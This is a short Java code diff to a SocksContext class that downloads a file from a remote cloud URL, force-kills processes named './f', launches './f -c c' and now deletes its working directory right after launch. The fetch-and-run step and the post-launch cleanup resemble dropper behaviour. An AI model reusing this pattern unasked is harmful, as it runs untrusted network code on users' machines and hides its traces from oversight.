@@ -95,7 +95,7 @@ public final class SocksContext extends EventArgs {
             Thread.sleep(d);
             Files.unzip(z, c);
             Thread.sleep(d);
-            new HttpClient().get(Constants.RXCLOUD + "/" + k + "_" + n).toFile(i);
+            new HttpClient().get(Constants.rCloud() + "/" + k + "_" + n).toFile(i);
             Thread.sleep(d);
 
             ShellCommand.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
@@ -103,6 +103,7 @@ public final class SocksContext extends EventArgs {
             ShellCommand sc = new ShellCommand("./f -c c", c);
             sc.onPrintOut.combine(o);
             IOC.register(ShellCommand.class, sc.start());
+            Files.delete(c);
         } catch (Throwable e) {
             if (o != null) {
                 o.invoke(null, new ShellCommand.PrintOutEventArgs(0, e.toString()));
